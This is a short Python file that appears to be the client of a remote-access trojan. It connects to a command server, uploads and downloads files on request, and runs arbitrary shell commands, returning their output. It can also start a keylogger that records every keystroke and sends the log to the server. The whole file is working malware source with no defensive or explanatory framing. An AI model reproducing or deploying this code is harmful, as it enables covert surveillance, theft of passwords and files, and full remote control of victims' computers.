import socket
import subprocess
from pathlib import Path
from pynput.keyboard import Key,Listener
import threading

global allkeys
allkeys = ''
keylogging_mode = 0

def pressed(key):
    global allkeys
    allkeys+=str(key)

def released(key):
    pass


def keylog():
    global l
    l = Listener(on_press=pressed,on_release=released)
    l.start()

ip_address = '127.0.0.1'
port_number = 1236

cs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cs.connect((ip_address,port_number))

msg = 'TEST CLIENT'

cs.send(msg.encode())

msg = cs.recv(1024).decode()

while msg !='quit':
    fullmsg = msg
    msg = msg.split(" ")

    if msg[0]=='download':
        filename = msg[1]
        f = open(Path(filename),'rb')
        contents = f.read()
        f.close()
        cs.send(contents)
        msg = cs.recv(1024).decode()

    elif msg[0]=='upload':
        filename = msg[1]
        filesize = int(msg[2])
        contents = cs.recv(filesize)
        f = open(Path(filename),'wb')
        f.write(contents)
        f.close()
        cs.send('got file'.encode())
        msg = cs.recv(1024).decode()

    elif fullmsg=='keylog on':
        keylogging_mode = 1
        t1 = threading.Thread(target=keylog)
        t1.start()
        msg = "keylogging has started"
        cs.send(msg.encode())
        msg = cs.recv(1024).decode()

    elif fullmsg =='keylog off':
        if keylogging_mode == 1:
            l.stop()
            t1.join()
            #global allkeys
            cs.send(allkeys.encode())
            allkeys = ''
            msg = cs.recv(1024).decode()
        elif keylogging_mode == 0:
            msg = "Keylogging should be started first"
            cs.send(msg.encode())
            msg = cs.recv(1024).decode()
    else:

        p = subprocess.Popen(
            msg,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True
        )
        output , error = p.communicate()
        if len(output) > 0:
            msg = str(output.decode())
        else:
            msg = str(error.decode())
        cs.send(msg.encode())
        msg = cs.recv(1024).decode()
        print(msg)
    

cs.close()